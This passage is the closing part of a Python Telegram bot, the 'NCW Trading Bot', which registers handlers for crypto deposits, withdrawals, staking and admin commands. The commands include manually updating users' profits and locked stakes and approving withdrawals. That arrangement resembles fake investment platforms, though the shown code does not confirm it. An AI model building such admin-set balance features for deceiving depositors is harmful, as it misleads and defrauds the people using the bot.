    application.add_handler(CallbackQueryHandler(handle_crypto_selection, pattern='^crypto_select_'))
    application.add_handler(CallbackQueryHandler(handle_withdrawal, pattern='^withdraw$'))
    application.add_handler(CallbackQueryHandler(show_withdraw_crypto_options, pattern='^withdraw_crypto$'))
    application.add_handler(CallbackQueryHandler(handle_withdraw_crypto_select, pattern='^withdraw_select_'))
    application.add_handler(CallbackQueryHandler(show_trading_bot, pattern='^trading_bot$'))
    application.add_handler(CallbackQueryHandler(select_trading_bot, pattern='^select_bot_'))
    application.add_handler(CallbackQueryHandler(handle_stake, pattern='^stake$'))
    application.add_handler(CallbackQueryHandler(stake_deposit, pattern='^stake_deposit$'))
    application.add_handler(CallbackQueryHandler(start_staking, pattern='^start_staking$'))
    application.add_handler(CallbackQueryHandler(select_staking_coin, pattern='^stake_coin_'))
    application.add_handler(CallbackQueryHandler(select_staking_plan, pattern='^stake_plan_'))
    application.add_handler(CallbackQueryHandler(select_staking_duration, pattern='^stake_duration_'))
    application.add_handler(CallbackQueryHandler(cancel_operation, pattern='^cancel$'))
    application.add_handler(CallbackQueryHandler(copy_address, pattern='^copy_address_'))
    application.add_handler(CallbackQueryHandler(payment_made, pattern='^payment_made$'))
    
    # REMOVE THESE LINES - They're causing the problem by intercepting callbacks
    # application.add_handler(CallbackQueryHandler(handle_deposit, pattern='^deposit$'))
    # application.add_handler(CallbackQueryHandler(handle_withdrawal, pattern='^withdraw$'))
    # application.add_handler(CallbackQueryHandler(show_trading_bot, pattern='^trading_bot$'))
    # application.add_handler(CallbackQueryHandler(handle_stake, pattern='^stake$'))
    # application.add_handler(CallbackQueryHandler(refresh_balance, pattern='^refresh_balance$'))
    # application.add_handler(CallbackQueryHandler(visit_website, pattern='^visit_website$'))
    # application.add_handler(CallbackQueryHandler(show_crypto_options, pattern='^deposit_crypto$'))
    # application.add_handler(CallbackQueryHandler(handle_crypto_selection, pattern='^crypto_select_'))
    # application.add_handler(CallbackQueryHandler(withdraw_crypto_amount, pattern='^withdraw_crypto$'))
    # application.add_handler(CallbackQueryHandler(withdraw_bank_amount, pattern='^withdraw_bank$'))
    # application.add_handler(CallbackQueryHandler(select_trading_bot, pattern='^select_bot_'))
    # application.add_handler(CallbackQueryHandler(copy_address, pattern='^copy_address_'))
    # application.add_handler(CallbackQueryHandler(payment_made, pattern='^payment_made$'))
    
    # Command handlers (these can stay)
    application.add_handler(CommandHandler("getid", get_id))
    application.add_handler(CommandHandler("adminpanel", admin_panel))
    application.add_handler(CommandHandler("approve", approve_deposit))
    application.add_handler(CommandHandler("approvewithdrawal", approve_withdrawal))
    application.add_handler(CommandHandler("rejectwithdrawal", reject_withdrawal))
    application.add_handler(CommandHandler("updatestake", update_stake))
    application.add_handler(CommandHandler("updatelocked", update_locked_stake))
    application.add_handler(CommandHandler("updateprofit", update_profit))
    application.add_handler(CommandHandler("updatecrypto", update_crypto_address))
    application.add_handler(CommandHandler("listusers", list_users))
    application.add_handler(CommandHandler("adminhelp", admin_help))
    application.add_handler(CommandHandler("sendlogin", send_login))
    application.add_error_handler(error_handler)
    # Fallback text/photo handlers for users not inside a ConversationHandler
    application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, top_level_text_handler))
    application.add_handler(MessageHandler(filters.PHOTO, top_level_photo_handler))
    
    logger.info("Starting NCW Trading Bot...")
    application.run_polling(allowed_updates=Update.ALL_TYPES, timeout=30)

if __name__ == '__main__':
    main()